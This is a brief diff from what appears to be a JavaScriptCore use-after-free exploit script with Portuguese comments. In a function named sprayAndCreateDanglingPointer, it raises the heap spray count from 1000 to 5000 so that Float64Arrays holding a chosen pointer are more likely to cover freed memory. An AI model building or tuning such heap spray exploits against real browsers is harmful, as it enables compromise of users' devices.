@@ -285,7 +285,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     // PASSO 3: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
     logFn("--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada ---", "subtest");
     const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 1000; // Aumentado para melhor chance de hit
+    const SPRAY_COUNT_UAF_NEW = 5000; // Aumentado para melhor chance de hit
     const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima
 
     // --- Determinar o ponteiro a ser pulverizado ---
